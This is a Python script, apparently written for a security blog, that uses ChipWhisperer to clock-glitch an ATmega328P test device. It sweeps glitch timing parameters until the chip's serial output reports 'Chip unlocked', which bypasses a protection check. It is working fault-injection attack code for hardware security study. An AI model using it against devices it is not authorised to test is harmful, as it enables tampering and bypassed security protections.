#!/usr/bin/env python3

import chipwhisperer as cw
import chipwhisperer.common.results.glitch as glitch
import time
import logging

print("[+] Atmega328P Clock Glitch")
print("[+] Written for https://Blog.Securitybits.io")

scope = None
scope = cw.scope()

assert scope != None

print("[+] Connected to Chipwhisperer")
scope.default_setup()

scope.adc.timeout = 0.1
scope.io.nrst = "high"          # Pin 1 on DUT
scope.io.tio1 = "serial_tx"     
scope.io.tio2 = "serial_rx"     # Pin 3 on DUT
scope.io.tio4 = "high_z"
scope.io.hs2  = "glitch"        # Pin 9 on DUT
scope.glitch.clk_src     = "clkgen"
scope.glitch.trigger_src = "manual"
scope.glitch.repeat      = 1
scope.glitch.output      = "clock_xor"
scope.clock.clkgen_freq  = 16E6 # 16MHz Clock Signal

target = cw.target(scope)       # Serial Rx Setup to communicate with target
target.baud = 19200

gc = glitch.GlitchController(
        groups = ["success", "reset", "normal"], 
        parameters = ["width", "offset", "ext_offset"]
    )

# Parameters to set the timing of the glitch
gc.set_range("width", 40, 40)       
gc.set_range("offset", -35, -25)   
gc.set_range("ext_offset", 5, 10)
gc.set_global_step(1)
scope.glitch.repeat = 10

# Reset function for the DUT
def reboot_flush():
    scope.io.nrst = "low"
    time.sleep(0.05)
    scope.io.nrst = "high_z"
    time.sleep(0.05)
    target.flush()
    return

cw.glitch_logger.setLevel(logging.ERROR)

print("[+] Reset target chip and Start the Gltich cycle")

reboot_flush()

for glitch_setting in gc.glitch_values():
    scope.glitch.width = glitch_setting[0]
    scope.glitch.offset = glitch_setting[1]
    scope.glitch.ext_offset = glitch_setting[2]
    
    target.flush()
    scope.arm()
    scope.glitch.manualTrigger()
    val = target.read(128)
    
    if 'Chip unlocked' in val:
        print(val)
        print('[+] offset: {}  |  [+] width: {}  |  [+] ext_offset: {}'.format(scope.glitch.offset, scope.glitch.width, scope.glitch.ext_offset))
        break